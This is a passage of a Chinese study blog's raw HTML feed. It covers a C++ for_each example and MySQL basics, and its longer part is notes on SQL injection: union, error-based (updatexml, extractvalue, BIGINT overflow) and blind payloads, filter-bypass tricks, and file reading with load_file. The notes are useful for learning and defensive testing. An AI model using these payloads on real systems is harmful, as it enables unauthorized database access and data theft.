class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std<br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; a &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>vector&lt;<span class="hljs-type">int</span>&gt;v;<br>v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">10</span>);<br>v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">20</span>);<br>v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">30</span>);<br>v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">40</span>);<br>v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">50</span>);<br><span class="hljs-comment">//迭代器</span><br><span class="hljs-comment">//vector&lt;int&gt;::iterator itbegin = v.begin();//v.begin()起始迭代器</span><br><span class="hljs-comment">//vector&lt;int&gt;::iterator itend = v.end();//v.end()结束迭代器，指向容器中最后一个元素的下一位置</span><br><span class="hljs-comment">////while循环遍历</span><br><span class="hljs-comment">//1、while (itbegin != itend)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; *itbegin &lt;&lt; endl;</span><br><span class="hljs-comment">//itbegin++;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">////2、for循环遍历</span><br><span class="hljs-comment">//for (vector&lt;int&gt;::iterator itbegin = v.begin(); itbegin &lt; v.end(); itbegin++)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; *itbegin &lt;&lt; endl;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//3、for_each算法</span><br>for_each(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), print);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">test01</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL学习</title>
    <link href="/2025/03/10/MySQL%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/10/MySQL%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL连接"><a href="#MySQL连接" class="headerlink" title="MySQL连接"></a>MySQL连接</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -u your_username -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><ul><li><code>-u</code> 参数用于指定用户名。</li><li><code>-p</code> 参数表示需要输入密码。</li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">mysql -u<span class="hljs-built_in"> root</span> -p//使<span class="hljs-built_in">用root</span>用户登录<br></code></pre></td></tr></table></figure><p>退出：exit；或者quit；</p><h2 id="使用PHP脚本连接"><a href="#使用PHP脚本连接" class="headerlink" title="使用PHP脚本连接"></a>使用PHP脚本连接</h2><p>mysql_connect()，6个参数全部是可选，在成功连接后返回连接标识，失败返回FALSE</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysqli_connect</span>(host, username, password, dbname,port, socket);<br></code></pre></td></tr></table></figure><p><code>host</code>：规定主机名或IP</p><p><code>username</code>：规定MySQL用户名</p><p><code>password</code>：密码</p><p><code>dbname</code>：规定默认的数据库</p><p><code>port</code>：端口号</p><p><code>socket</code>：规定socket或要使用的已命名的pipe</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bool</span> mysql_close(mysql <span class="hljs-variable">$link</span>)<br></code></pre></td></tr></table></figure><blockquote><p>通常不需使用mysql_close()，已打开的非持久连接在脚本执行完毕后会自动关闭</p></blockquote><p>eg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接成功！&#x27;</span>;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><h2 id="creat"><a href="#creat" class="headerlink" title="creat"></a>creat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">creat database if not exists mydatabase;//避免数据库已经存在<br>character set utf8mb4//指定一些选项，字符集<br>collate utf8mb4_general_ci;//排序规则<br></code></pre></td></tr></table></figure><h2 id="使用mysqladmin创建"><a href="#使用mysqladmin创建" class="headerlink" title="使用mysqladmin创建"></a>使用mysqladmin创建</h2><p>mysqladmin -u your_username -p creat your_databse</p><ul><li><code>-u</code> 参数用于指定 MySQL 用户名。</li><li><code>-p</code> 参数表示需要输入密码。</li><li><code>create</code> 是执行的操作，表示创建数据库。</li><li><code>your_database</code> 是要创建的数据库的名称。</li></ul><p>mysqladmin 执行其他管理任务</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mysqladmin -u your_username -<span class="hljs-selector-tag">p</span> your_command<br>eg:<br>mysqladmin -u your_username -<span class="hljs-selector-tag">p</span> status<span class="hljs-comment">//查看服务器状态</span><br><br></code></pre></td></tr></table></figure><h2 id="PHP脚本"><a href="#PHP脚本" class="headerlink" title="PHP脚本"></a>PHP脚本</h2><p>mysqli_query，该函数有两个参数，执行成功返回true,否则返回false.</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysqli_query</span>(connection,query,resultmode);<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>connection</em></td><td>必需。规定要使用的 MySQL 连接。</td></tr><tr><td><em>query</em></td><td>必需，规定查询字符串。</td></tr><tr><td><em>resultmode</em></td><td>可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td></tr></tbody></table><h1 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h1><blockquote><p>注：删除前，请确保你想删除的数据库及所有数据，因为操作不可逆</p></blockquote><h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> &lt;database_name&gt;;<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span>[<span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span>] &lt;database_name&gt;;<br></code></pre></td></tr></table></figure><h2 id="使用mysqladmin"><a href="#使用mysqladmin" class="headerlink" title="使用mysqladmin"></a>使用mysqladmin</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysqladmin -u your_username -<span class="hljs-selector-tag">p</span> drop your_database<br></code></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;连接失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;连接成功&lt;br /&gt;&#x27;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;DROP DATABASE RUNOOB&#x27;</span>;<br><span class="hljs-variable">$retval</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>( <span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span> );<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$retval</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;删除数据库失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据库 RUNOOB 删除成功\n&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="SQL注入——基础版"><a href="#SQL注入——基础版" class="headerlink" title="SQL注入——基础版"></a>SQL注入——基础版</h1><blockquote><p>SQL注入中用单引号不要编码，编码就不要用单引号</p></blockquote><h2 id="有回显型"><a href="#有回显型" class="headerlink" title="有回显型"></a>有回显型</h2><p>即页面会将SQL语句返回的内容显示在页面中（标题、内容、作者）</p><h3 id="联合查询注入union"><a href="#联合查询注入union" class="headerlink" title="联合查询注入union"></a>联合查询注入union</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,2,3<br>union select 1,user(),database()--+<br>union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=&#x27;数据库名&#x27;--+<br>union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=&#x27;表名&#x27;--+<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">正常查询语句 <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> columns_name <span class="hljs-keyword">from</span> (<span class="hljs-keyword">database</span>.)<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">where</span> condition<br>#若回显只有一行数据，可以让正常查询语句返回为空<br>#前后俩个语句返回的字段数必须相同<br></code></pre></td></tr></table></figure><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>使用一些特殊的函数，会在报错信息里返回参数</p><p>exp()、floor()+and()、updatexml()、extractive()等</p><p><strong><code>updatexml</code></strong>:</p><ul><li>这是MySQL中的一个函数，用于更新XML文档。它的语法是 <code>updatexml(target_xml, xpath_expr, new_xml)</code>。</li></ul><p><strong><code>updatexml(1, concat(...), 1)</code></strong>:</p><ul><li>这里的 <code>1</code> 是占位符，实际并不会被使用。</li><li>由于 <code>updatexml</code> 的第一个参数是一个XML文档，而我们传入的并不是一个有效的XML文档，这会导致一个错误。</li><li>MySQL会返回一个错误消息，其中包含 <code>concat</code> 函数生成的字符串，从而泄露了当前数据库用户的名称。</li></ul><blockquote><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>假设当前数据库用户的名称是 <code>root@localhost</code>，那么 <code>concat(0x7e, (select user()), 0x7e)</code> 会生成字符串 <code>~root@localhost~</code>。由于 <code>updatexml</code> 函数的第一个参数不是一个有效的XML文档，MySQL会返回一个错误消息，其中包含这个字符串。</p><h3 id="错误消息示例："><a href="#错误消息示例：" class="headerlink" title="错误消息示例："></a>错误消息示例：</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">XPATH</span> syntax <span class="hljs-literal">error</span>: <span class="hljs-string">&#x27;~root<span class="hljs-variable">@localhost</span>~&#x27;</span><br></code></pre></td></tr></table></figure><p>通过解析这个错误消息，攻击者可以知道当前数据库用户的名称是 <code>root@localhost</code>。</p><p>将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。</p><p>注意：</p><ul><li>报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。</li><li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。</li></ul></blockquote><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>使用永真or 1&#x3D;1或永假or 1&#x3D;2 返回内容是否相同进行布尔盲注</p><p>利用or只要有一个语句为真则全为真</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=$username <span class="hljs-keyword">or</span>(condition)<br>#如果我们将condition语句为真，则整条语句为真，即使我们在$username添加一个肯定不存在的用户名,我们可将condition写为<span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">8</span>来判断数据库名长度，或者acsii(<span class="hljs-built_in">substr</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">130</span>再用二分法快速获取数据名（逐字判断）<br></code></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>通过一些可以产生时间差的函数，判断返回内容的响应时间差异判断，sleep()，benchmark()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span>*form <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-variable">$username</span> (and|or)<span class="hljs-keyword">if</span>(length(database()))&gt;8,<span class="hljs-built_in">sleep</span>(3),1)<br></code></pre></td></tr></table></figure><p>如果数据库名长度大于8，那么if条件执行sleep(3)，此条语句将进行延迟3秒操作，否则if条件直接返回1，无延迟直接返回</p><h1 id="SQL注入——进阶"><a href="#SQL注入——进阶" class="headerlink" title="SQL注入——进阶"></a>SQL注入——进阶</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="and-or-被过滤-拦截"><a href="#and-or-被过滤-拦截" class="headerlink" title="and&#x2F;or 被过滤&#x2F;拦截"></a>and&#x2F;or 被过滤&#x2F;拦截</h3><ol><li>双写<code>anandd、oorr</code></li><li>使用运算符代替<code>&amp;&amp;、||</code></li><li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li><li>其他方法，如：<code>?id=1^(condition)</code></li></ol><h3 id="空格被过滤-拦截"><a href="#空格被过滤-拦截" class="headerlink" title="空格被过滤&#x2F;拦截"></a>空格被过滤&#x2F;拦截</h3><ol><li>多层括号嵌套</li><li>改用+号</li><li>使用注释代替</li><li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and&#x2F;or前的空格可用省略</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li></ol><p>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h3 id="括号被过滤-拦截"><a href="#括号被过滤-拦截" class="headerlink" title="括号被过滤&#x2F;拦截"></a>括号被过滤&#x2F;拦截</h3><ul><li>order by 大小比较盲注</li></ul><h3 id="逗号被过滤-拦截"><a href="#逗号被过滤-拦截" class="headerlink" title="逗号被过滤&#x2F;拦截"></a>逗号被过滤&#x2F;拦截</h3><ol><li>改用盲注</li><li>使用join语句代替</li><li><code>substr(data from 1 for 1)</code>相当于<code>substr(data,1,1)</code>、<code>limit 9 offset 4</code>相当于<code>limt 9,4</code></li></ol><h3 id="其他系统关键字被过滤-拦截"><a href="#其他系统关键字被过滤-拦截" class="headerlink" title="其他系统关键字被过滤&#x2F;拦截"></a>其他系统关键字被过滤&#x2F;拦截</h3><ol><li>双写绕过关键字过滤</li><li>使用同义函数&#x2F;语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li></ol><h3 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤&#x2F;拦截&#x2F;转义"></a>单双引号被过滤&#x2F;拦截&#x2F;转义</h3><ol><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li><li>不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</li></ol><h1 id="Latin1默认编码，没学会……"><a href="#Latin1默认编码，没学会……" class="headerlink" title="Latin1默认编码，没学会……"></a>Latin1默认编码，没学会……</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><ul><li>BigInt等数据类型溢出</li><li>函数参数格式错误</li><li>主键&#x2F;字段重复</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p>该函数会返回e的x次方，当超过mysql的double数值范围该函数会报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()a)))<br>#<span class="hljs-type">BigInt</span>等数据类型溢出<br>函数参数格式错误<br>主键<span class="hljs-operator">/</span>字段重复<br></code></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>函数语法：<code>updatexml(XML_document, XPath_string, new_value);</code></p><p>适用版本: 5.1.5+</p><p>我们通常在第二个xpath参数填写我们要查询的内容。</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>前后添加~使其不符合xpath格式从而报错。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="BigInt等数据类型溢出"><a href="#BigInt等数据类型溢出" class="headerlink" title="BigInt等数据类型溢出"></a>BigInt等数据类型溢出</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote><p>只有5.5.5及其以上版本的MySQL才会产生溢出错误消息，之下的版本对于整数溢出不会发送任何消息。</p><p>数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mysql&gt; select 9223372036854775807<span class="hljs-string">+1</span>;<br><span class="hljs-keyword">ERROR </span>1690 (22003): BIGINT value is out of range in &#x27;(9223372036854775807 + 1)&#x27;<br></code></pre></td></tr></table></figure><p>如果我们对数值0逐位取反，结果会怎么样呢？ 当然是得到一个无符号的最大BIGINT值，这一点是显而易见的。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select ~0;</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| ~0 |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">| 18446744073709551615 |</span><br><span class="hljs-section">+----------------------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>所以，如果我们对~0进行加减运算的话，也会导致BIGINT溢出错误。</p></blockquote><h4 id="提取技术"><a href="#提取技术" class="headerlink" title="提取技术"></a>提取技术</h4><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span>;<br>ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> range <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;((not((select &#x27;</span>root@localhost<span class="hljs-string">&#x27; from dual))) - ~(0))&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>我们先不使用加法，因为“+”通过网页浏览器进行解析的时候，会被转换为空白符（不过，你可以使用%2b来表示“+”）。 相反，我们可以使用减法。所以说，同一种注入攻击，可以有完全不同的变种。 最终的查询语句如下所示。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">!(<span class="hljs-selector-tag">select</span>*<span class="hljs-selector-tag">from</span>(<span class="hljs-selector-tag">select</span> user())<span class="hljs-attribute">x</span>)-~<span class="hljs-number">0</span><br>(<span class="hljs-selector-tag">select</span>(!<span class="hljs-attribute">x</span>-~<span class="hljs-number">0</span>)<span class="hljs-selector-tag">from</span>(<span class="hljs-selector-tag">select</span>(<span class="hljs-selector-tag">select</span> user())<span class="hljs-attribute">x</span>)<span class="hljs-selector-tag">a</span>)<br>(<span class="hljs-selector-tag">select</span>!<span class="hljs-attribute">x</span>-~<span class="hljs-number">0</span><span class="hljs-selector-class">.from</span>(<span class="hljs-selector-tag">select</span>(<span class="hljs-selector-tag">select</span> user())<span class="hljs-attribute">x</span>)<span class="hljs-selector-tag">a</span>)<br></code></pre></td></tr></table></figure><h4 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h4><p>提取数据的方法，跟其他注入攻击手法中的一样，这里只做简单介绍。<br>首先，我们来获取表名：<br>!(select<em>from(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)x)-~0<br>取得列名：<br>select !(select</em>from(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)x)-<del>0;<br>检索数据：<br>!(select*from(select concat_ws(‘:’,id, username, password) from users limit 0,1)x)-</del>0;</p><h4 id="利用插入语句进行注入"><a href="#利用插入语句进行注入" class="headerlink" title="利用插入语句进行注入"></a>利用插入语句进行注入</h4><hr><p>利用插入语句，我们也可以进行类似的注入攻击，具体语法为</p><p><code>&#39;&#39; or (payload) or &#39;&#39;</code>。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;Eyre&#x27;</span>);<br>ERROR <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-type">BIGINT</span> UNSIGNED <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> range <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;((not((select &#x27;</span>root@localhost<span class="hljs-string">&#x27; from dual))) - ~(0))&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="利用更新语句进行注入"><a href="#利用更新语句进行注入" class="headerlink" title="利用更新语句进行注入"></a>利用更新语句进行注入</h4><p>update users set password&#x3D;’peter’ or !(select*form( select user() ) x)-~0 or ‘’ where id &#x3D;4;</p><h4 id="利用删除语句进行注入"><a href="#利用删除语句进行注入" class="headerlink" title="利用删除语句进行注入"></a>利用删除语句进行注入</h4><p>delete from users where id&#x3D;’1’ or ! (select*from (select user () )x)-~0 or ‘’;</p><h1 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h1><p>当用户为root时可以实现跨库注入，利用user()查看当前用户名，查询语句与正常一致，但最后要加上指向特定数据库，如：security.username</p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">load_file(&#x27;d:\\1.txt&#x27;)<br></code></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>触发的条件很苛刻，php中的<code>mysqli_multi_query</code>函数</p><p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span 